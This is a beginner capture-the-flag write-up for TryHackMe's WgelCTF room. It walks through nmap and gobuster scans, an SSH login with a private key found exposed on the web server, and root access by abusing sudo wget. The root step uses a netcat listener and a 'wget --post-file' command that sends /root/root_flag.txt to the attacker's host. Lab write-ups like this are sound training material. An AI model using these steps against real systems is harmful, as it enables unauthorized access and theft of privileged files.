
[https://tryhackme.com](https://tryhackme.com/). Link to the room: [https://tryhackme.com/room/wgelctf](https://tryhackme.com/room/wgelctf). Now lets get hacking!
****

# Information
- CTF Name: WgelCTF
- CTF Level:Beginer
- CTF Description: A hands-on CTF focuusing on web vulnerabilities,desiged for learning and skill development
- Date: 26/09/24
- Platform: TryHackMe
- Category: Web Application Security
- IP: 10.8.38.148 (IP that the ctf gave to me)

# Findings
### Credentials

first create a folder so as to arrange your wgel easily
![[Pasted image 20240925232120.png]]
**Reconnaissance & User Flag**
before every thing, make sure that you are connected to vpn.
After running our nmap scan we find just two open ports, 22 (ssh) and 80 (http).

> nmap -sV -PN -p- wgel.thm -o nmapresults.txt

![[Pasted image 20240925230805.png]]

Lets check the web page out. We land on the default Apache2 Ubuntu page. I click view source, and spot a message: “Jessie don’t forget to update the website”. Looks like we have a potential username.

Next I run gobuster and discover the “/sitemap” directory.

> gobuster dir -u http://wgel.thm -w /usr/share/wordlists/dirb/small.txt
![[Pasted image 20240926004957.png]]

after looking around he page we donot get any information, so we run another gobstur scan on the `/sitemap` directory.

We find a .ssh directory,The directory contains an rsa private key. We can use this to login.
Copy the rsa key to your attacker machine, and give the file the correct permissions (in this case, it wants the private key to be only readable/write-able by our own user): “chmod 600 id_rsa”
Then we can login with ssh by using the username we found earlier and the rsa key (make sure you are using the rsa key you found on the web-server!)
> ssh -i id_rsa jessie@user>
![[Pasted image 20240926010851.png]]

We are in! We can locate the flag by using the command “locate”.
![[Pasted image 20240926010559.png]]
- after all, you can use cat /user_flag.txt then you will see 
####Root Flag
I do my sudo -l and discover we can run /usr/bin/wget as root. Perfect, time to go to GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)). We search for wget and find our exploit. After doing a bit of research on this exploit, I see we need to start a netcat listener on our personal attacker machine and then run wget as sudo and then post the file we want on the victim machine:

> Attacker machine: nc -lvnp 4444
> 
> victim machine(on jessie’s user in this case): sudo /usr/bin/wget — post-file=/root/root_flag.txt [http://your TryHackMe Ip adres here>:4444](http://10.11.12.95:4444)
There we go, we get the root flag!
then paste your answer to TryHackMe

![[Pasted image 20240926012125.png]]

ENJOY!!!!